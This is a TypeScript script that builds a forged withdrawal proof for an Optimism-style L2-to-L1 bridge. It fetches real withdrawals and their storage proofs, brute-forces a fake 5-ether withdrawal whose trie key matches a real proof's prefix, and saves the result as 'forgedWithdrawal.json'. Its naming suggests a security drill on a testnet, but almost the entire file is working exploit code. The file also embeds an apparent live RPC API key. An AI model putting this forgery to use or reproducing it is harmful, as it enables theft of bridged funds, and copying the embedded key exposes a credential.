import { BigNumber, ethers } from 'ethers'
import { rlp,  keccak256, bufferToHex } from 'ethereumjs-util';
import { hashWithdrawal } from '@eth-optimism/core-utils/'
import * as fs from 'fs';
import * as path from 'path';

// Finds the slot for sentMessages[hash] in the L2toL1MessagePasser
function calculateMappingSlot(key: string): string {
  const slotHex = ethers.utils.hexZeroPad(ethers.utils.hexlify(0), 32);
  const data = key + slotHex.slice(2);
  return ethers.utils.keccak256(data);
}

// Give a storage slot computes the key used in the trie lookup (i.e. the keccak256 of the slot)
function hashSlotHex(slotHex) {
  const formattedHex = slotHex.startsWith('0x') ? slotHex.slice(2) : slotHex;
  const paddedHex = formattedHex.padStart(64, '0');
  const slotBuffer = Buffer.from(paddedHex, 'hex');
  return bufferToHex(keccak256(slotBuffer));
}

async function getStorageProof(contractAddress: string, storageKey: string, l2BlockNumber: string): Promise<any> {
  const keyHex = ethers.utils.hexZeroPad(ethers.utils.hexlify(storageKey), 32);
  return await DRILL_L2_PROVIDER.send('eth_getProof', [contractAddress, [keyHex], l2BlockNumber]);
}

// Helper function for decoding the RLP
function decodeCompact(encoded: Buffer): string {
  if (encoded.length === 0) return '';
  let nibbles = '';
  for (let i = 0; i < encoded.length; i++) {
      nibbles += encoded[i].toString(16).padStart(2, '0');
  }
  // Remove the even/odd flag
  let firstByte = parseInt(nibbles.substring(0, 2), 16);
  let offset = firstByte % 2 === 0 ? 2 : 1;
  firstByte -= offset;
  nibbles = firstByte.toString(16).padStart(2, '0') + nibbles.substring(2);
  // Convert back to nibbles, correctly handling the first byte
  return nibbles.substring(offset * 2);
}

function getProofNodeInfo(encodedNode: string): string {
  const formattedNode = encodedNode.startsWith('0x') ? encodedNode.slice(2) : encodedNode;
  const nodeBuffer = Buffer.from(formattedNode, 'hex');
  const node = rlp.decode(nodeBuffer) as unknown as Buffer[];
  if (Array.isArray(node) && node.length === 17) {
      return 'branch';
  } else if (Array.isArray(node) && node.length === 2) {
      const path = decodeCompact(node[0]);
      const isLeaf = (node[0][0] & 0x20) !== 0;
      return isLeaf ? `leaf [path=${path}] [value=${node[1].toString('hex')}]` : `extension [path=${path}]`;
  }
  return 'unknown';
}

/**********************************************************************

***********************************************************************/

async function fetchRecentWithdrawalEvents(): Promise<any> {
  const abi = [
    "event MessagePassed(uint256 indexed nonce, address indexed sender, address indexed target, uint256 value, uint256 gasLimit, bytes data, bytes32 withdrawalHash)"
  ];
  const contract = new ethers.Contract(L2TOL1MESSAGEPASSER_ADDRESS, abi, DRILL_L2_PROVIDER);
  const toBlock = await DRILL_L2_PROVIDER.getBlockNumber();
  const fromBlock = toBlock - 1_000_000;

  const eventFilter = contract.filters.MessagePassed();

  const events = await contract.queryFilter(eventFilter, fromBlock, toBlock);

  const eventData = events.map(event => ({
    nonce: event.args.nonce,
    sender: event.args.sender,
    target: event.args.target,
    value: event.args.value,
    gasLimit: event.args.gasLimit,
    data: event.args.data,
    withdrawalHash: event.args.withdrawalHash
  }));

  return eventData;
}

/**********************************************************************

***********************************************************************/

async function getProofInfo(l2BlockNumber: string, input_hash: string) {
  const calculatedSlot = calculateMappingSlot(input_hash);
  const proof = await getStorageProof(L2TOL1MESSAGEPASSER_ADDRESS, calculatedSlot, l2BlockNumber);
  const nodeTypes = proof.storageProof[0].proof.map(getProofNodeInfo);
  return {proof, nodeTypes};
}

// Iterate through different gasLimit and data values until the tx has a trie key prefix
// that matches the neededPrefix argument
async function findMatchingHash(neededPrefix: string) {
  // NOTE: change these values if you want the fake tx to be different
  const tx = {
      nonce: BigNumber.from('0x01000000000000000000000000000000000000000000000000000000004073'),
      sender: '0x4200000000000000000000000000000000000007',
      target: '0x88d893d62f2A90Fd2C939040feab4E13A9C4F313',
      value: ethers.utils.parseUnits("5", "ether"),
      // Note: adding a random number btw 0-1000 here makes this script return different withdrawal hashes each time
      gasLimit: BigNumber.from('300000').add(Math.floor(Math.random() * 1001)),
      data: '0x0000'
  };

  let dataCounter = 0;
  for (let i = 0; i < 5_000_000; i++) {
      let hexData = dataCounter.toString(16).padStart(4, '0');
      tx.data = '0x' + hexData;

      const calculatedHash = hashWithdrawal(
          tx.nonce,
          tx.sender,
          tx.target,
          tx.value,
          tx.gasLimit,
          tx.data
      );
      const key = hashSlotHex(calculateMappingSlot(calculatedHash));

      if (key.slice(0, neededPrefix.length) === neededPrefix) {
          return tx;
      }

      dataCounter++;
      if (dataCounter > 0xFFFF) {
          dataCounter = 0;
          tx.gasLimit = BigNumber.from(tx.gasLimit.add(1));
      }
  }
}


async function getFakeTx(l2BlockNumber: string) {
  // Find recent REAL withdrawals
  const allWithdrawalEvents = await fetchRecentWithdrawalEvents();

  // limit to 100 to be faster
  const withdrawalEvents = allWithdrawalEvents.slice(0, 100);

  console.log(`Searching through ${withdrawalEvents.length} recent withdrawals for fake proof candidates`)

  // Find the one with the shortest prefix that we'll need to match
  var bestRealProofLen = 1_000_000;
  var bestRealProofIdx;
  for (var i = 0; i < withdrawalEvents.length; ++i) {
    const { nodeTypes } = await getProofInfo(l2BlockNumber, withdrawalEvents[i].withdrawalHash);

    // We need the proof to end on a leaf node, and there can't be any extension nodes
    let lastElementIsALeaf = nodeTypes[nodeTypes.length - 1].includes("leaf");
    let containsExtensionNode = nodeTypes.some(item => item.includes("extension"));
    if (!lastElementIsALeaf || containsExtensionNode) continue;

    if (bestRealProofLen > nodeTypes.length) {
      bestRealProofLen = nodeTypes.length;
      bestRealProofIdx = i;
    }
  }

  // Now iterate through fake txs until one matches the prefix of the shortest
  // REAL withdrawal hash proof we just found
  const realTx = withdrawalEvents[bestRealProofIdx];
  const { proof, nodeTypes } = await getProofInfo(l2BlockNumber, realTx.withdrawalHash);

  // This is the hash we get by deriving it from the event information ourselves
  const calculatedHash = hashWithdrawal(
    realTx.nonce,
    realTx.sender,
    realTx.target,
    realTx.value,
    realTx.gasLimit,
    realTx.data
  );

  // It should equal the hash that was actually emitted
  if (calculatedHash != realTx.withdrawalHash) {
    throw new Error('withdrawalHash log')
  }

  const key = hashSlotHex(calculateMappingSlot(calculatedHash));
  const neededPrefix = key.slice(0, nodeTypes.length + 3);

  console.log(`Found good candidate - withdrawalHash: ${calculatedHash}, prefixNeeded: ${neededPrefix}, nodeTypes: ${nodeTypes}`)

  // Find a good matching hash
  const fakeTx = await findMatchingHash(neededPrefix);

  const fakeKey = hashSlotHex(
    calculateMappingSlot(
      hashWithdrawal(
        fakeTx.nonce,
        fakeTx.sender,
        fakeTx.target,
        fakeTx.value,
        fakeTx.gasLimit,
        fakeTx.data
      )
    )
  );

  console.log(`Found final tx - fake trie key: ${fakeKey}, real trie key: ${key}`);
  const finalProof = proof.storageProof[0].proof;
  // console.log('Proof to use:', finalProof)
  // console.log('Fake tx:', fakeTx);
  // console.log('Real tx:', realTx);

  return { finalProof, realTx, fakeTx };

}

/**********************************************************************

***********************************************************************/

const DRILL_L2_RPC_URL = process.env.L2_RPC_URL
if (!DRILL_L2_RPC_URL) {
  throw new Error('L2_RPC_URL env variable not set')
}
const DRILL_L2_PROVIDER = new ethers.providers.JsonRpcProvider(DRILL_L2_RPC_URL);
const L1_RPC_URL = 'https://eth-sepolia.g.alchemy.com/v2/FR4XVgEGA6N8aR7GlpGTeqPNsfxhjV71';
const L1_PROVIDER = new ethers.providers.JsonRpcProvider(L1_RPC_URL);
const L2TOL1MESSAGEPASSER_ADDRESS = "0x4200000000000000000000000000000000000016";
const L2OUTPUTORACLE_ADDRESS = process.env.L2OUTPUTORACLE_ADDRESS
if (!L2OUTPUTORACLE_ADDRESS) {
  throw new Error('L2OUTPUTORACLE_ADDRESS env variable not set')
}

/**********************************************************************

***********************************************************************/


interface OutputProposal {
  outputRoot: string;
  timestamp: ethers.BigNumber;
  l2BlockNumber: ethers.BigNumber;
}

async function getFakeProof() {
  const abi = [
    {
        "constant": true,
        "inputs": [
            {
                "name": "_l2OutputIndex",
                "type": "uint256"
            }
        ],
        "name": "getL2Output",
        "outputs": [
            {
                "components": [
                    {"name": "outputRoot", "type": "bytes32"},
                    {"name": "timestamp", "type": "uint128"},
                    {"name": "l2BlockNumber", "type": "uint128"}
                ],
                "name": "",
                "type": "tuple"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [],
        "name": "latestOutputIndex",
        "outputs": [
            {
                "name": "",
                "type": "uint256"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    }
  ];


  const contract = new ethers.Contract(L2OUTPUTORACLE_ADDRESS, abi, L1_PROVIDER);
  const l2OutputIndex = await contract.latestOutputIndex();
  const result: OutputProposal = await contract.getL2Output(l2OutputIndex);
  const l2BlockNumber = result.l2BlockNumber;

  // Annoying bug: the eth_getBlockByNumber requires no leading zeroes in the hex string (after the intial 0x)
  // and the `toHexString()` function might do that. So need to do manual removal of leading zeroes.
  let cleanedHexString = '0x' + parseInt(l2BlockNumber.toHexString(), 16).toString(16);

  const block = await DRILL_L2_PROVIDER.send('eth_getBlockByNumber', [cleanedHexString, true]);
  const proof = await getStorageProof(L2TOL1MESSAGEPASSER_ADDRESS, '0x00', block.number); // just need this for the stateRoot

  console.log('L2 outputIndex:', l2OutputIndex.toNumber());
  console.log('L2 block stateRoot:', block.stateRoot);
  console.log('L2 block number:', block.number);
  console.log('L2 block hash:', block.hash);
  console.log('L2ToL1MessagePasser stateRoot:', proof.storageHash);
  console.log('Overall output Root:', result.outputRoot);
  console.log('----------')

  const { finalProof, realTx, fakeTx } = await getFakeTx(block.number);

  const data = {
    proof: finalProof,
    nonce: fakeTx.nonce.toString(),
    sender: fakeTx.sender,
    target: fakeTx.target,
    value: fakeTx.value.toString(),
    gasLimit: fakeTx.gasLimit.toString(),
    data: fakeTx.data,
    l2OutputIndex: l2OutputIndex.toNumber(),
    version: "0x0000000000000000000000000000000000000000000000000000000000000000",
    stateRoot: block.stateRoot,
    storageHash: proof.storageHash,
    latestBlockhash: block.hash
  };

  const NETWORK_PREFIX = process.env.NETWORK_PREFIX; // don't throw an error if empty because DEV one will be empty

  // Resolve the path to the output JSON file relative to this script
  const outputFilePath = path.resolve(__dirname, `./stored_withdrawals/${NETWORK_PREFIX}forgedWithdrawal.json`);

  fs.writeFileSync(outputFilePath, JSON.stringify(data, null, 2));
  console.log(`Data has been written to ${outputFilePath}`);
}

getFakeProof();
